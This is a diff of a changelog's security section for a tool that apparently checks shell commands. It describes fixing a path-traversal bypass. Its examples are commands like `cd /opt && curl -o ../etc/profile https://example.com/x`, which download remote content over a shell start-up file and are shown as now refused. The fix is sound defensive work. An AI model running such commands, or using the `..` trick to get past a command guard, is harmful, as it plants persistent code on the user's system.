@@ -1,3 +1,3 @@
 ### Security
 - A download or redirect that climbs out of a folder with `..` after a `cd` is now read from the folder it lands in. Before, `cd /opt && curl -o ../etc/profile https://example.com/x` was checked as the text `/opt/../etc/profile` and passed the shell start-up file rule; it is now refused like `curl -o /etc/profile`. The Node.js and Python engines behave the same.
-- A target that climbs above the home folder (for example `cd ~ && curl -o ../../etc/profile https://example.com/x`) is now resolved from `/home` instead of being cut off there, so it is refused too.
+- A target that climbs above the home folder (for example `cd ~ && curl -o ../../etc/profile https://example.com/x`) is no longer cut off at `/home`. The depth of the real home folder is not known (`/root` is one level, `/home/<user>` two), so it is read at both depths and refused when either names a start-up file.
